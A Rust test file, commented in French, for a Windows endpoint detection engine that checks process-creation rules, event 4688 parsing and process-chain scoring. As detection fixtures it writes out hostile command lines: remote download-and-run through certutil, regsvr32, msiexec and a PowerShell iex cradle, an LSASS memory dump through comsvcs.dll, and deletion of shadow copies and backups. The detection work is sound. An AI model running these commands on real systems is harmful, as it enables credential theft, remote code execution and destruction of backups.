        let a = crate::processus::alerte_processus(1, &p).expect(origine);
        assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.comportement.as_str()), ("PRC-002", "Alerte", "PRC-002:obscurci"), "{origine}");
        assert_eq!(a.mitre, "T1059.001 / T1027");
        assert!(a.raisons.contains(r"C:\Users\Public\p.exe -NoP"), "ligne montrée telle quelle : {}", a.raisons);
    }
    // Autre programme : rien
    let p = crate::processus::InfoProcessus::pour_test(copie, Some(&ligne), Some(EXPLORATEUR)).avec_nom_origine("notepad.exe");
    assert!(crate::processus::alerte_processus(1, &p).is_none());
}

#[test]
fn prc_002_negatif() {
    // Script d'administration ordinaire ; « -enc » suivi d'un texte court (pas une charge encodée)
    assert_eq!(regle_processus(POWERSHELL, Some(r"powershell.exe -ExecutionPolicy Bypass -File C:\scripts\inventaire.ps1"), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(POWERSHELL, Some("powershell.exe -enc UwB0AGEAcgB0AA=="), Some(EXPLORATEUR)), None);
    // A-7-1 : nom d'une commande de téléchargement sans adresse ni iex, adresse seule sans téléchargement, paramètre en
    // « -e… » qui n'est pas -EncodedCommand suivi d'un long texte, script lancé par -File (son contenu n'est pas lu)
    for ligne in ["powershell -c \"Get-Help Invoke-WebRequest -Full\"", "powershell -c \"Write-Host 'voir https://learn.microsoft.com'\"",
                  &format!("powershell -ExecutionPolicy {} -File a.ps1", "A".repeat(48)), r"powershell -File C:\scripts\maj.ps1 -Source https://intranet.local/x"] {
        assert_eq!(regle_processus(POWERSHELL, Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
    }
}

#[test]
fn prc_003_positif() {
    assert_eq!(regle_processus(r"C:\Windows\System32\certutil.exe", Some("certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-003", "Alerte"));
    assert_eq!(regle_processus(r"C:\Windows\System32\mshta.exe", Some("mshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\")"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-003", "Alerte"));
}

#[test]
fn prc_003_negatif() {
    // Usages ordinaires des mêmes outils
    assert_eq!(regle_processus(r"C:\Windows\System32\certutil.exe", Some("certutil.exe -store My"), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(r"C:\Windows\System32\rundll32.exe", Some(r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL"), Some(EXPLORATEUR)), None);
    // A-7-7 : DLL d'un dossier du système, paquet MSI local ou sur un partage (déploiement d'entreprise ordinaire),
    // regsvr32 d'une DLL installée, mshta d'un fichier local
    for (exe, ligne) in [("rundll32", "rundll32 shell32.dll,Control_RunDLL"), ("msiexec", r"msiexec /i C:\Temp\a.msi /qn"),
                         ("msiexec", r"msiexec /i \\serveur\deploiement\app.msi /qn"), ("regsvr32", r#"regsvr32 /s "C:\Program Files\Editeur\module.dll""#),
                         ("certutil", "certutil -verifyctl AuthRoot"), ("rundll32", r"rundll32.exe C:\Windows\System32\comsvcs.dll,ServiceMain")] {
        assert_eq!(regle_processus(&format!(r"C:\Windows\System32\{exe}.exe"), Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
    }
}

/// Audit du 2026-11-23, A-7-7 : formes de PRC-003 manquées avant, avec l'outil (code de comportement), la technique et
/// le niveau : le vidage de la mémoire de LSASS par comsvcs.dll est un signal fort (Critique, jamais adouci)
#[test]
fn prc_003_formes_elargies() {
    let cas = [
        (r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\l.dmp full", "comsvcs", "T1003.001", "Critique"),
        (r"rundll32 comsvcs.dll #24 624 C:\Users\Public\l.dmp full", "comsvcs", "T1003.001", "Critique"),
        (r"rundll32.exe C:\Users\Public\x.dll,DllRegisterServer", "rundll32_dll", "T1218.011", "Alerte"),
        (r#"rundll32.exe "C:\Users\x\AppData\Roaming\a b\x.dll",Start"#, "rundll32_dll", "T1218.011", "Alerte"),
        (r"rundll32 C:\ProgramData\x.dll,Run", "rundll32_dll", "T1218.011", "Alerte"),
        ("msiexec /q /i http://203.0.113.5/a.msi", "msiexec", "T1218.007", "Alerte"),
        (r"mshta \\hote\partage\a.hta", "mshta", "T1218", "Alerte"),
        (r"regsvr32 /s /n /u /i:\\hote\s\f.sct scrobj.dll", "regsvr32", "T1218", "Alerte"),
        ("regsvr32 -s -i:http://203.0.113.5/f.sct scrobj.dll", "regsvr32", "T1218", "Alerte"),
        ("certutil -verifyctl -f -split http://203.0.113.5/a.exe", "certutil", "T1105", "Alerte"),
    ];
    for (ligne, outil, technique, niveau) in cas {
        let p = crate::processus::InfoProcessus::pour_test(r"C:\Windows\System32\rundll32.exe", Some(ligne), Some(EXPLORATEUR));
        let a = crate::processus::alerte_processus(1, &p).unwrap_or_else(|| panic!("{ligne}"));
        assert_eq!((a.regle.as_str(), a.niveau.as_str()), ("PRC-003", niveau), "{ligne}");
        assert_eq!(a.comportement, format!("PRC-003:{outil}"), "{ligne}");
        assert_eq!(a.mitre, technique, "{ligne}");
    }
}

#[test]
fn prc_004_positif() {
    assert_eq!(regle_processus(r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                               Some(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222 --headless"#), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-004", "Alerte"));
}

#[test]
fn prc_004_negatif() {
    // WebView2 (composant d'applications) en débogage ; navigateur lancé normalement
    assert_eq!(regle_processus(r"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\msedgewebview2.exe",
                               Some(r#""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\msedgewebview2.exe" --remote-debugging-port=0"#), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                               Some(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default"#), Some(EXPLORATEUR)), None);
    // A-7-9 : Firefox n'est pas retenu (ses cookies se lisent sur le disque sans débogage ; débogage surtout par les
    // outils de test) ; un browser.exe hors du dossier de Yandex non plus (nom trop générique)
    for ligne in [r#""C:\Program Files\Mozilla Firefox\firefox.exe" --remote-debugging-port 9222"#, r"C:\Outils\browser.exe --remote-debugging-port=9222",
                  r#""C:\Program Files\Vivaldi\Application\vivaldi.exe" --profile-directory=Default"#] {
        assert_eq!(regle_processus(r"C:\x.exe", Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
    }
}

/// Audit du 2026-11-23, A-7-9 : autres navigateurs Chromium (Vivaldi, Opera, Yandex, Arc ; Chromium s'appelle
/// chrome.exe) lancés en débogage à distance
#[test]
fn prc_004_navigateurs_chromium() {
    for ligne in [r#""C:\Users\x\AppData\Local\Vivaldi\Application\vivaldi.exe" --remote-debugging-port=9222"#,
                  r"C:\Users\x\AppData\Local\Programs\Opera\opera.exe --remote-debugging-port=9222 --headless",
                  r"C:\Users\x\AppData\Local\Yandex\YandexBrowser\Application\browser.exe --remote-debugging-pipe",
                  r#""C:\Program Files\WindowsApps\TheBrowserCompany.Arc_1.0.0.0_x64__ttt1ap7aakyb4\Arc.exe" --remote-debugging-port=9222"#,
                  r"C:\Users\x\AppData\Local\Chromium\Application\chrome.exe --remote-debugging-port=0"] {
        assert_eq!(regle_processus(r"C:\x.exe", Some(ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-004", "Alerte"), "{ligne}");
    }
}

#[test]
fn prc_005_positif() {
    assert_eq!(regle_processus(r"C:\Windows\System32\vssadmin.exe", Some("vssadmin.exe delete shadows /all /quiet"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-005", "Critique"));
    assert_eq!(regle_processus(r"C:\Windows\System32\bcdedit.exe", Some("bcdedit /set {default} recoveryenabled No"), Some(EXPLORATEUR)),
               regle_et_niveau("PRC-005", "Critique"));
    // Audit du 2026-11-23, A-7-3 : autres façons de supprimer les clichés ou les sauvegardes
    for ligne in ["powershell -c \"Get-WmiObject Win32_ShadowCopy | Remove-WmiObject\"", "powershell -c \"Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\"",
                  "powershell -c \"gwmi win32_shadowcopy | foreach { $_.Delete() }\"",
                  "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB", "wbadmin delete backup -keepVersions:0 -quiet",
                  "bcdedit /set {default} bootstatuspolicy ignoreallfailures", "diskshadow delete shadows all",
                  "cmd /c \"echo delete shadows all > s.txt & diskshadow /s s.txt\""] {
        assert_eq!(regle_processus(r"C:\Windows\System32\cmd.exe", Some(ligne), Some(EXPLORATEUR)), regle_et_niveau("PRC-005", "Critique"), "{ligne}");
    }
    // Ancien faux négatif (fiche, avant la PR 3.7) : un motif PowerShell plus tôt dans la ligne ne masque plus la suppression
    // des sauvegardes, qui donne la règle et le niveau
    let p = crate::processus::InfoProcessus::pour_test(POWERSHELL,
        Some("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a'); vssadmin delete shadows /all"), Some(EXPLORATEUR));
    let a = crate::processus::alerte_processus(1234, &p).expect("alerte");
    assert_eq!((a.regle.as_str(), a.niveau.as_str(), a.score), ("PRC-005", "Critique", 10));
    assert!(a.raisons.contains("PowerShell obscurci") && a.raisons.contains("suppression des sauvegardes"), "les deux motifs : {}", a.raisons);
}

#[test]
fn prc_005_negatif() {
    // Lecture des clichés, sans suppression
    assert_eq!(regle_processus(r"C:\Windows\System32\vssadmin.exe", Some("vssadmin.exe list shadows"), Some(EXPLORATEUR)), None);
    assert_eq!(regle_processus(r"C:\Windows\System32\wbadmin.exe", Some("wbadmin get versions"), Some(EXPLORATEUR)), None);
    // A-7-3 : lecture des clichés par WMI, agrandissement de l'espace des clichés, diskshadow sur un script seul (son
    // contenu n'est pas lu : la ligne ne dit pas s'il supprime), politique de démarrage ordinaire
    for ligne in ["powershell -c \"Get-WmiObject Win32_ShadowCopy | Select-Object ID,InstallDate\"", "vssadmin list shadowstorage",
                  "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=20%", "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=UNBOUNDED",
                  "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=50GB",
                  "diskshadow /s sauvegarde.txt", "diskshadow list shadows all", "bcdedit /set {default} bootstatuspolicy displayallfailures"] {
        assert_eq!(regle_processus(r"C:\Windows\System32\cmd.exe", Some(ligne), Some(EXPLORATEUR)), None, "{ligne}");
    }
}

// ------------------------------------------------------------ CHA : chaînes de processus (PR 3.7)
// chaines::Arbre sur une liste de processus synthétique : explorer → cmd → powershell → certutil

fn arbre_de_test() -> crate::chaines::Arbre {
    let explorateur = format!(r"{}\explorer.exe", crate::natif::dossier_windows());
    arbre_avec_chemins(&[(100, "explorer", 4), (200, "cmd", 100), (300, "powershell", 200), (400, "certutil", 300), (500, "notepad", 100)],
                       &[(100, &explorateur)])
}

/// Arbre synthétique (pid, nom, parent) et chemins des programmes lus (pid, chemin) ; un pid absent n'a pas de chemin lu
fn arbre_avec_chemins(processus: &[(u32, &str, u32)], chemins: &[(u32, &str)]) -> crate::chaines::Arbre {
    use crate::natif::InfoListe;
    let mut arbre = crate::chaines::Arbre::default();
    let liste: std::collections::HashMap<u32, InfoListe> =
        processus.iter().map(|&(pid, nom, parent)| (pid, InfoListe { nom: nom.into(), parent })).collect();
    let chemins: std::collections::HashMap<u32, String> = chemins.iter().map(|&(p, c)| (p, c.to_string())).collect();
    arbre.maj_avec(&liste, &|pid| chemins.get(&pid).cloned().unwrap_or_default());
    arbre
}

/// Audit du 2026-11-23, A-7-5 : un parent n'est une racine que par le chemin exact du programme système sous le dossier
/// Windows. Un svchost.exe ou taskhostw.exe dans un dossier temporaire qui lance deux étapes signalées : une chaîne,
/// une alerte Critique (avant : coupée en deux chaînes de 5 et 7, aucune alerte)
#[test]
fn cha_001_racine_par_chemin() {
    let dossier = crate::natif::dossier_windows();
    let explorateur = format!(r"{dossier}\explorer.exe");
    let svchost = format!(r"{dossier}\System32\svchost.exe");
    for (nom, chemin) in [("svchost", r"C:\Users\x\AppData\Local\Temp\svchost.exe"), ("taskhostw", r"C:\Users\Public\taskhostw.exe")] {
        let mut arbre = arbre_avec_chemins(&[(100, "explorer", 4), (200, nom, 100), (300, "cmd", 200), (400, "certutil", 200)],
                                           &[(100, &explorateur), (200, chemin)]);
        arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
        arbre.signaler(400, 7, "connexion vers une adresse inconnue");
        let chaines = arbre.chaines();
        assert_eq!(chaines.len(), 1, "{chemin}");
        assert_eq!(chaines[0].racine, nom);
        let a = arbre.alertes(&chaines);
        assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str(), a.score)).collect::<Vec<_>>(), [("CHA-001", "Critique", 12)], "{chemin}");
    }
    // Le vrai programme système (chemin exact sous le dossier Windows) et l'Explorateur réel restent des racines : deux
    // étapes sans lien que leur lanceur ne forment pas une chaîne
    for lanceur in [200, 100] {
        let mut arbre = arbre_avec_chemins(&[(100, "explorer", 4), (200, "svchost", 100), (300, "cmd", lanceur), (400, "certutil", lanceur)],
                                           &[(100, &explorateur), (200, &svchost)]);
        arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
        arbre.signaler(400, 7, "connexion vers une adresse inconnue");
        let chaines = arbre.chaines();
        assert_eq!(chaines.len(), 2, "lanceur {lanceur}");
        assert!(arbre.alertes(&chaines).is_empty(), "lanceur {lanceur}");
    }
    // Un nom système dans un autre dossier de Windows (pas le chemin exact) n'est pas une racine
    let tasks = format!(r"{dossier}\Tasks\svchost.exe");
    let mut arbre = arbre_avec_chemins(&[(200, "svchost", 4), (300, "cmd", 200), (400, "certutil", 200)], &[(200, &tasks)]);
    arbre.signaler(300, 5, "a");
    arbre.signaler(400, 7, "b");
    assert_eq!(arbre.chaines().len(), 1);
    // Chemin inconnu (illisible) : pas une racine, sens prudent (la chaîne continue)
    let mut arbre = arbre_avec_chemins(&[(100, "explorer", 4), (300, "cmd", 100), (400, "certutil", 100)], &[]);
    arbre.signaler(300, 5, "a");
    arbre.signaler(400, 7, "b");
    assert_eq!(arbre.chaines().len(), 1);
}

#[test]
fn cha_001_positif() {
    // Deux signaux dans la même descendance, score cumulé au seuil (12) : une alerte Critique, une seule fois par niveau
    let mut arbre = arbre_de_test();
    arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
    arbre.signaler(400, 7, "connexion vers une adresse inconnue");
    let chaines = arbre.chaines();
    let a = arbre.alertes(&chaines);
    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.niveau.as_str(), a.score)).collect::<Vec<_>>(), [("CHA-001", "Critique", 12)]);
    assert!(arbre.alertes(&chaines).is_empty(), "pas de nouvelle alerte au même score");
    // Score plus haut : nouvelle alerte
    arbre.signaler(200, 3, "écriture dans un dossier de démarrage");
    let chaines = arbre.chaines();
    assert_eq!(arbre.alertes(&chaines).len(), 1);
}

// ------------------------------------------------------------ couverture ATT&CK, lot 1 : règles de processus sur les 4688

/// Événement 4688 tel que le rend le journal Sécurité (champs utiles seulement)
fn xml_4688(pid: &str, image: &str, ligne: Option<&str>, ppid: &str, parent: Option<&str>) -> String {
    let mut x = format!("<Event><System><EventID>4688</EventID></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-1-2-3-1001</Data>\
        <Data Name='NewProcessId'>{pid}</Data><Data Name='NewProcessName'>{image}</Data><Data Name='ProcessId'>{ppid}</Data>");
    if let Some(l) = ligne {
        x += &format!("<Data Name='CommandLine'>{l}</Data>");
    }
    if let Some(p) = parent {
        x += &format!("<Data Name='ParentProcessName'>{p}</Data>");
    }
    x + "</EventData></Event>"
}

#[test]
fn attack_lot1_4688_parseur() {
    use crate::processus::{lire_4688, pid_4688, LIGNE_MAX};
    let d = crate::evenements::donnees(&xml_4688("0x1a2c", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        Some("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"), "0x3e8", Some(r"C:\Windows\System32\cmd.exe")));
    let c = lire_4688(&d).expect("4688 complet");
    assert_eq!((c.pid, c.ppid), (0x1a2c, Some(1000)));
    assert!(c.image.ends_with("powershell.exe") && c.ligne_commande.as_deref().unwrap().starts_with("powershell -enc"));
    assert_eq!(c.parent_image.as_deref(), Some(r"C:\Windows\System32\cmd.exe"));
    // PID : hexadécimal préfixé seulement ; sans préfixe, vide, nul, signe, trop long ou non hexadécimal : refusé
    assert_eq!(pid_4688(" 0X10 "), Some(16));
    for v in ["1234", "0x", "0x0", "0x+1", "0x-1", "0x123456789", "0xzz", "", "  "] {
        assert_eq!(pid_4688(v), None, "{v:?}");
    }
    // Champs absents : sans PID ou sans programme, rien ; ligne de commande ou parent absents ou vides : None
    assert!(lire_4688(&crate::evenements::donnees(&xml_4688("1234", r"C:\a.exe", None, "0x4", None))).is_none());
    assert!(lire_4688(&crate::evenements::donnees(&xml_4688("0x10", "  ", None, "0x4", None))).is_none());
    let c = lire_4688(&crate::evenements::donnees(&xml_4688("0x10", r"C:\a.exe", Some("   "), "zz", None))).unwrap();
    assert_eq!((c.ligne_commande, c.ppid, c.parent_image), (None, None, None));
    // Ligne de commande très longue : bornée
    let longue = "a".repeat(LIGNE_MAX + 5000);
    let c = lire_4688(&crate::evenements::donnees(&xml_4688("0x10", r"C:\a.exe", Some(&longue), "0x4", None))).unwrap();
    assert_eq!(c.ligne_commande.unwrap().chars().count(), LIGNE_MAX);
    // Mini-fuzz : aucun texte reçu ne fait paniquer le parseur
    let valide = xml_4688("0x1a2c", r"C:\x\powershell.exe", Some("powershell -c 1"), "0x3e8", Some(r"C:\x\cmd.exe"));
    crate::tests::torturer_texte(&valide, &mut |t| {
        let _ = lire_4688(&crate::evenements::donnees(t));
    });
}

#[test]
fn attack_lot1_source_des_regles_de_processus() {
    use crate::collectes::Note;
    use crate::processus::{audit_analyse, note_audit};
    // Sans Sysmon : l'audit analyse s'il est actif ou partiel, sinon WMI
    assert!(audit_analyse(Note::Active as u8) && audit_analyse(Note::Partielle as u8));
    for n in [Note::Inconnue, Note::Indisponible, Note::Desactivee] {
        assert!(!audit_analyse(n as u8), "{n:?}");
    }
    let geree = || Some("Poste géré par domaine Active Directory : la baseline est en lecture seule".to_string());
    let libre = || None;
    // État de la collecte : jamais « rien de suspect » quand l'audit manque, repli sur WMI toujours dit
    assert_eq!(note_audit(true, Some(3), true, (5, 0), false, &libre), (Note::Active, String::new()));
    let (n, r) = note_audit(false, Some(1), true, (0, 0), true, &libre);
    assert!(n == Note::Indisponible && r.contains("journal Sécurité illisible") && r.contains("WMI"), "{r}");
    let (n, r) = note_audit(true, None, true, (0, 0), false, &libre);
    assert!(n == Note::Indisponible && r.contains("illisible"), "{r}");
    let (n, r) = note_audit(true, Some(2), true, (0, 0), false, &libre);
    assert!(n == Note::Desactivee && r.contains("non activé") && r.contains("WMI"), "audit jamais activé : {r}");
    let (n, r) = note_audit(true, Some(0), true, (0, 0), true, &libre);
    assert!(n == Note::Indisponible && r.contains("coupé"), "audit coupé après avoir été actif : {r}");
    let (n, r) = note_audit(true, Some(0), true, (0, 0), false, &geree);
    assert!(n == Note::Desactivee && r.contains("WMI") && r.contains("lecture seule"), "poste géré : repli dit : {r}");
    let (n, r) = note_audit(true, Some(1), false, (3, 0), false, &libre);
    assert!(n == Note::Partielle && r.contains("ligne de commande absente"), "réglage de la ligne de commande coupé : {r}");
    let (n, _) = note_audit(true, Some(1), true, (0, 4), false, &libre);
    assert_eq!(n, Note::Partielle, "4688 vus sans ligne de commande");
    assert_eq!(note_audit(true, Some(1), true, (0, 0), false, &libre).0, Note::Active, "aucun 4688 vu : rien n'indique un manque");
    // Couverture publiée : audit actif, PRC-002 n'est plus dégradée ; audit absent, WMI partiel : dégradée
    use crate::collectes::{besoins, couverture, Collecte, Couverture, EtatPublie};
    let etat = |audit: EtatPublie| move |c| match c {
        Collecte::AuditProcessus => audit.clone(),
        Collecte::WmiProcessus => EtatPublie::Partielle("p".into()),
        _ => EtatPublie::Desactivee("d".into()),
    };
    assert_eq!(couverture(besoins("PRC-002"), &etat(EtatPublie::Active)), Couverture::Assuree);
    assert_eq!(couverture(besoins("PRC-002"), &etat(EtatPublie::Desactivee("n".into()))), Couverture::Degradee);
}

#[test]
fn attack_lot1_processus_termine_detecte_par_son_4688() {
    use crate::collectes::Note;
    use crate::processus::{InfoProcessus, Processus};
    // Le défaut corrigé : sans Sysmon, un PowerShell bref était déjà terminé quand WMI l'interrogeait. Le 4688 porte
    // tout (programme, ligne de commande, parent) : PRC-002 se lève sans que le processus vive encore
    let p = Processus::nouveau();
    p.regler_audit_test(Note::Active);
    let x = xml_4688("0xfffff0", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        Some("powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"),
        "0xfffff4", Some(r"C:\Windows\System32\cmd.exe"));
    p.traiter_4688(&x);
    let a = std::mem::take(&mut *p.detections.lock().unwrap());
    assert_eq!(a.iter().map(|a| a.regle.as_str()).collect::<Vec<_>>(), ["PRC-002"]);
    assert_eq!(a[0].parent, r"C:\Windows\System32\cmd.exe");
    assert_eq!(p.creations.lock().unwrap().len(), 1, "création transmise à l'arbre des chaînes");
    assert_eq!(p.source_publiee(), "Audit 4688");
    // Même création relue (passage d'une source à l'autre) : une seule alerte
    p.traiter_4688(&x);
    assert!(p.detections.lock().unwrap().is_empty(), "une seule alerte par création");
    // Témoin négatif : PowerShell ordinaire, aucune alerte
    p.traiter_4688(&xml_4688("0xfffff8", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", Some("powershell.exe -NoProfile -File C:\\scripts\\sauvegarde.ps1"), "0xfffff4", None));
    assert!(p.detections.lock().unwrap().is_empty(), "PowerShell ordinaire");
    // Prérelecture de #244, D1 : audit noté actif mais aucun 4688 livré (audit coupé depuis le dernier relevé, journal
    // bloqué) : la création vue par WMI alerte quand même ; son 4688, s'il arrive ensuite, est fusionné
    let q = Processus::nouveau();
    q.regler_audit_test(Note::Active);
    let trace = InfoProcessus::pour_test(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        Some("powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"),
        Some(r"C:\Windows\System32\cmd.exe"));
    q.analyser(0xfffff0, &trace);
    assert_eq!(q.detections.lock().unwrap().len(), 1, "audit actif sans 4688 : WMI alerte");
    q.traiter_4688(&x);
    assert_eq!(q.detections.lock().unwrap().len(), 1, "4688 de la même création fusionné");
    // Audit jamais activé : un 4688 qui arriverait quand même est analysé (aucune source n'est tue)
    let r = Processus::nouveau();
    r.regler_audit_test(Note::Desactivee);
    r.traiter_4688(&x);
    assert_eq!(r.detections.lock().unwrap().len(), 1);
    assert_eq!(r.creations.lock().unwrap().len(), 1);
}

/// Prérelecture de #244 : la boucle WMI analyse chaque création, sans filtre selon l'état de l'audit (D1) ; ce test
/// verrouille le source, la boucle n'étant pas appelable hors de Windows
#[test]
fn attack_lot1_boucle_wmi_sans_filtre() {
    let p = include_str!("processus.rs");
    let debut = p.find("for evenement in flux.flatten() {").expect("boucle WMI");
    let fin = p[debut..].find("// Flux terminé").expect("fin de la boucle WMI") + debut;
    let boucle = &p[debut..fin];
    assert!(boucle.contains("moi.analyser(pid, &info);"), "la boucle WMI n'analyse plus");
    assert!(!boucle.contains("audit_analyse") && !boucle.contains("moi.audit"), "filtre de l'audit revenu dans la boucle WMI");
    let t = &p[p.find("pub(crate) fn traiter_4688").unwrap()..];
    let t = &t[..t.find("pub fn source_publiee").unwrap()];
    // L'état de l'audit peut y demander une relecture de son état (réveil), jamais empêcher l'analyse : aucun retour
    // anticipé conditionné par l'audit
    assert!(t.contains("self.analyser(c.pid, &info);"), "traiter_4688 n'analyse plus");
    assert!(!regex::Regex::new(r"audit_analyse\([^)]*\)\)\s*\{\s*return").unwrap().is_match(t), "filtre de l'audit dans traiter_4688");
    assert!(!t.contains("if audit_analyse"), "analyse conditionnée par l'audit dans traiter_4688");
}

/// Après l'installation, la baseline active l'audit des créations de processus : un 4688 reçu alors que l'audit est noté
/// inactif demande une relecture de son état (la page Santé ne dit plus « non activé » pendant 5 min) ; audit déjà actif :
/// aucune relecture demandée
#[test]
fn attack_lot1_4688_recu_audit_inactif_relu() {
    use crate::collectes::Note;
    use crate::processus::Processus;
    let x = xml_4688("0x10", r"C:\Windows\notepad.exe", Some("notepad"), "0x4", None);
    let p = Processus::nouveau();
    p.regler_audit_test(Note::Desactivee);
    p.traiter_4688(&x);
    assert!(p.reveil_demande_test(), "audit noté inactif, 4688 reçu : relecture demandée");
    let q = Processus::nouveau();
    q.regler_audit_test(Note::Active);
    q.traiter_4688(&x);
    assert!(!q.reveil_demande_test());
}

#[test]
fn attack_lot1_une_alerte_par_creation_et_cache_wmi() {
    use crate::processus::{deja_signale, info_depuis_4688, Creation4688, InfoProcessus};
    use std::time::{Duration, Instant};
    let mut vus = std::collections::HashMap::new();
    let t = Instant::now();
    assert!(!deja_signale(&mut vus, 50, r"C:\x\PowerShell.exe", "PRC-002", t));
    assert!(deja_signale(&mut vus, 50, "powershell.exe", "PRC-002", t + Duration::from_secs(5)), "même création vue par l'autre source");
    assert!(!deja_signale(&mut vus, 50, "powershell.exe", "PRC-005", t + Duration::from_secs(5)), "règle plus forte vue par l'autre source");
    assert!(!deja_signale(&mut vus, 50, r"C:\x\cmd.exe", "PRC-002", t + Duration::from_secs(6)), "PID réutilisé par un autre programme");
    // Prérelecture de #244, D2 : même PID, même programme, création nouvelle deux minutes plus tard : elle alerte
    assert!(!deja_signale(&mut vus, 50, "powershell.exe", "PRC-002", t + Duration::from_secs(120)), "création nouvelle sous le même PID");
    // Ligne de commande absente du 4688 : reprise du cache WMI du même programme, jamais d'un autre
    let c = Creation4688 { pid: 9, image: r"C:\W\powershell.exe".into(), ligne_commande: None, ppid: Some(8), parent_image: None, heure: None };
    let wmi = InfoProcessus::pour_test(r"C:\W\powershell.exe", Some("powershell -enc AAAA"), Some(r"C:\W\cmd.exe"));
    let i = info_depuis_4688(&c, Some(&wmi));
    assert_eq!((i.ligne_commande.as_deref(), i.parent_chemin.as_deref()), (Some("powershell -enc AAAA"), Some(r"C:\W\cmd.exe")));
    let autre = InfoProcessus::pour_test(r"C:\W\notepad.exe", Some("notepad x"), None);
    assert_eq!(info_depuis_4688(&c, Some(&autre)).ligne_commande, None);
}

#[test]
fn attack_lot1_cha_001_processus_bref_garde_son_parent() {
    // Un enfant bref de cmd (PID 600), déjà terminé à la lecture de la liste : sans sa création (4688), il n'a pas de
    // parent dans l'arbre et ses signaux ne s'ajoutent pas à ceux de cmd ; avec elle, la chaîne atteint le seuil
    let mut sans = arbre_de_test();
    sans.signaler(200, 5, "PowerShell obscurci ou qui télécharge du code");
    sans.signaler(600, 7, "détournement d'outil Windows (LOLBin)");
    assert!(sans.alertes(&sans.chaines()).is_empty(), "sans la création, aucune chaîne");
    let mut arbre = arbre_de_test();
    arbre.creation(600, Some(200), r"C:\Windows\System32\certutil.exe", Some("certutil -urlcache -f http://x/y z"));
    arbre.signaler(200, 5, "PowerShell obscurci ou qui télécharge du code");
    arbre.signaler(600, 7, "détournement d'outil Windows (LOLBin)");
    let a = arbre.alertes(&arbre.chaines());
    assert_eq!(a.iter().map(|a| (a.regle.as_str(), a.score)).collect::<Vec<_>>(), [("CHA-001", 12)]);
    // La liste suivante (sans l'enfant terminé) ne l'efface pas ; un PID réutilisé par un autre programme le remplace
    let mut liste: std::collections::HashMap<u32, crate::natif::InfoListe> = std::collections::HashMap::new();
    liste.insert(200, crate::natif::InfoListe { nom: "cmd".into(), parent: 100 });
    arbre.maj(&liste);
    // Audit de #244, S244-01 : un 4688 en retard (ancien processus du PID 200) n'efface pas les signaux de cmd, vivant
    arbre.creation(200, Some(100), r"C:\Windows\System32\whoami.exe", None);
    arbre.signaler(200, 1, "autre indice");
    assert_eq!(arbre.chaines().iter().map(|c| c.score).max(), Some(13), "signaux du processus vivant gardés");
    arbre.creation(600, Some(500), r"C:\Windows\notepad.exe", None);
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "PID réutilisé : signaux de l'ancien programme effacés");
}

#[test]
fn cha_001_negatif() {
    // Un seul signal fort (14) : pas une chaîne ; deux signaux sous le seuil (11) : rien
    let mut arbre = arbre_de_test();
    arbre.signaler(400, 14, "connexion vers une adresse inconnue");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "un seul signal");
    let mut arbre = arbre_de_test();
    arbre.signaler(300, 5, "PowerShell obscurci ou qui télécharge du code");
    arbre.signaler(400, 6, "connexion vers une adresse inconnue");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "sous le seuil");
    // Deux signaux dans deux descendances distinctes de l'Explorateur (racine) : deux chaînes, aucune au seuil
    let mut arbre = arbre_de_test();
    arbre.signaler(400, 7, "connexion vers une adresse inconnue");
    arbre.signaler(500, 7, "connexion vers une adresse inconnue");
    assert!(arbre.alertes(&arbre.chaines()).is_empty(), "racines distinctes");
}

// ------------------------------------------------------------ CHA-001 : faux positifs du poste (audit du 2026-11-23, T-1)
// Jeux synthétiques qui reproduisent les motifs observés sur un poste de développement (aucune donnée du poste) : PID
// de parent réutilisé, entrée périmée gardée une heure, programmes lancés par le service, outil qui relance des
